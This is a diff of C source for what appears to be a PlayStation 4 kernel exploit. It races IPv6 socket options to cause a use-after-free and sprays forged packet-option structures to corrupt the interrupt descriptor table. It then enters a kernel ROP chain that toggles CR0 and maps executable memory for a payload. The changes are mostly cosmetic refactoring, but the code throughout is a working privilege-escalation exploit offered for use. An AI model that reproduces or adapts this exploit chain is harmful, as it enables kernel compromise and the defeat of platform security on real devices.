@@ -16,12 +16,16 @@
 #define IPV6_2292PKTINFO 19
 #define IPV6_2292PKTOPTIONS 25
 
+typedef unsigned long long ps4_dword;
+typedef unsigned int ps4_uint;
+typedef volatile int ps4_volatile_int;
+
 // ps4-rop-8cc generates thread-unsafe code, so each racing thread needs its own get_tclass function
 #define GET_TCLASS(name) int name(int s) {               \
     int v;                                               \
     socklen_t l = sizeof(v);                             \
     if(getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l)) \
-        *(volatile int*)0;                               \
+        *(ps4_volatile_int*)0;                               \
     return v;                                            \
 }
 GET_TCLASS(get_tclass)
@@ -30,31 +34,30 @@ GET_TCLASS(get_tclass_3)
 
 int set_tclass(int s, int val) {
 	if (setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)))
-		*(volatile int*)0;
+		*(ps4_volatile_int*)0;
 }
 
-#define TCLASS_MASTER 0x13370000
-#define TCLASS_MASTER_2 0x73310000
-#define TCLASS_SPRAY 0x41
-#define TCLASS_TAINT 0x42
+const static int TCLASS_MASTER = 0x13370000;
+const static int TCLASS_MASTER_2 = 0x73310000;
+const static int TCLASS_SPRAY = 0x41;
+const static int TCLASS_TAINT = 0x42;
 
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
 #define set_rthdr(s, buf, len)   setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
 #define free_pktopts(s)          setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0)
+#define set_pktinfo(s, buf)      setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo))
 
 int get_rthdr(int s, char* buf, int len) {
 	socklen_t l = len;
 	if (getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &l))
-		*(volatile int*)0;
+		*(ps4_volatile_int*)0;
 	return l;
 }
-
-#define set_pktinfo(s, buf) setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo))
 
 int get_pktinfo(int s, char* buf) {
 	socklen_t l = sizeof(struct in6_pktinfo);
 	if (getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l))
-		*(volatile int*)0;
+		*(ps4_volatile_int*)0;
 	return l;
 }
 
@@ -78,7 +81,7 @@ void* use_thread(void* arg) {
 	*(int*)CMSG_DATA(cmsg) = 0;
 	while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY)
 		if (set_pktopts(o->master_sock, buf, sizeof(buf)))
-			*(volatile int*)0;
+			*(ps4_volatile_int*)0;
 	o->triggered = 1;
 	o->done1 = 1;
 }
@@ -86,8 +89,7 @@ void* use_thread(void* arg) {
 void* free_thread(void* arg) {
 	struct opaque* o = (struct opaque*)arg;
 	while (!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY) {
-		if (free_pktopts(o->master_sock))
-			*(volatile int*)0;
+		if (free_pktopts(o->master_sock))*(ps4_volatile_int*)0;
 		nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
 	}
 	o->triggered = 1;
@@ -106,7 +108,7 @@ void trigger_uaf(struct opaque* o) {
 
 		for (int i = 0; i < 32; i++)
 			if (free_pktopts(o->spray_sock[i]))
-				*(volatile int*)0;
+				*(ps4_volatile_int*)0;
 
 		nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
 	}
@@ -127,8 +129,8 @@ int build_rthdr_msg(char* buf, int size) {
 }
 
 #define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
-#define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
-#define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))
+#define PKTOPTS_RTHDR_OFFSET   (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
+#define PKTOPTS_TCLASS_OFFSET  (offsetof(struct ip6_pktopts, ip6po_tclass))
 
 int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long long pktinfo) {
 	free_pktopts(overlap_sock);
@@ -137,17 +139,17 @@ int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long 
 	int tclass;
 	for (;;) {
 		for (int i = 0; i < 32; i++) {
-			*(unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
-			*(unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
+			*(ps4_dword*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
+			*(ps4_uint*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
 			if (set_rthdr(o->spray_sock[i], buf, l))
-				*(volatile int*)0;
+				*(ps4_volatile_int*)0;
 		}
 		tclass = get_tclass(o->master_sock);
 		if ((tclass & 0xffff0000) == tclass0)
 			break;
 		for (int i = 0; i < 32; i++)
 			if (set_rthdr(o->spray_sock[i], NULL, 0))
-				*(volatile int*)0;
+				*(ps4_volatile_int*)0;
 	}
 	return tclass & 0xffff;
 }
@@ -155,7 +157,7 @@ int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long 
 unsigned long long __builtin_gadget_addr(const char*);
 unsigned long long rop_call_funcptr(void(*)(void*), ...);
 
-void sidt(unsigned long long* addr, unsigned short* size)
+void sidt(ps4_dword* addr, unsigned short* size)
 {
 	char buf[10];
 	unsigned long long ropchain[14] = {
@@ -176,7 +178,7 @@ void sidt(unsigned long long* addr, unsigned short* size)
 	};
 	((void(*)(char*))ropchain)(buf);
 	*size = *(unsigned short*)buf;
-	*addr = *(unsigned long long*)(buf + 2);
+	*addr = *(ps4_dword*)(buf + 2);
 }
 
 void (*enter_krop)(void);
@@ -210,7 +212,7 @@ void pin_to_cpu(int cpu) {
 
 int main() {
 	if (!setuid(0)) return 179;
-	for (int i = 0; i < 16; i++) socket(AF_INET6, SOCK_DGRAM, 0); // New Socket 
+	for (int i = 0; i < 16; i++) socket(AF_INET6, SOCK_DGRAM, 0); // New Socket
 	int tmp;
 	uint64_t idt_base;
 	uint16_t idt_size;
@@ -223,8 +225,8 @@ int main() {
 	krop_read_cr0 = kernel_base + 0xa1b70;
 	krop_read_cr0_2 = kernel_base + 0xa1b70;
 	krop_write_cr0 = kernel_base + 0xa1b79;
-	int kevent_sock = socket(AF_INET6, SOCK_DGRAM, 0); // New Socket 
-	int master_sock = socket(AF_INET6, SOCK_DGRAM, 0); // New Socket 
+	int kevent_sock = socket(AF_INET6, SOCK_DGRAM, 0); // New Socket
+	int master_sock = socket(AF_INET6, SOCK_DGRAM, 0); // New Socket
 	krop_master_sock = master_sock * 8;
 	int spray_sock[512];
 	int q1 = 0, q2 = 0;
@@ -247,14 +249,14 @@ int main() {
 		return 1;
 	int overlap_sock = spray_sock[overlap_idx];
 	int cleanup1 = overlap_sock;
-	spray_sock[overlap_idx] = socket(AF_INET6, SOCK_DGRAM, 0); // New Socket 
+	spray_sock[overlap_idx] = socket(AF_INET6, SOCK_DGRAM, 0); // New Socket
 	overlap_idx = fake_pktopts(&opae, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
 	printf_("overlap_idx = %d\n", overlap_idx);
 	if (overlap_idx < 0)
 		return 1;
 	overlap_sock = spray_sock[overlap_idx];
 	int cleanup2 = overlap_sock;
-	spray_sock[overlap_idx] = socket(AF_INET6, SOCK_DGRAM, 0); // New Socket 
+	spray_sock[overlap_idx] = socket(AF_INET6, SOCK_DGRAM, 0); // New Socket
 	char buf[20];
 	printf_("get_pktinfo() = %d\n", get_pktinfo(master_sock, buf));
 	printf_("idt before corruption: ");
@@ -280,7 +282,13 @@ int main() {
 	enter_krop();
 	char* spray_start = spray_bin;
 	char* spray_stop = spray_end;
-	char* spray_map = mmap(0, spray_stop - spray_start, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
+	char* spray_map = mmap(
+		0, 
+		spray_stop - spray_start, 
+		PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, 
+		-1,
+		0
+	);
 	printf_("spray_map = 0x%llx\n", spray_map);
 	for (size_t i = 0; i < spray_stop - spray_start; i++)
 		spray_map[i] = spray_start[i];
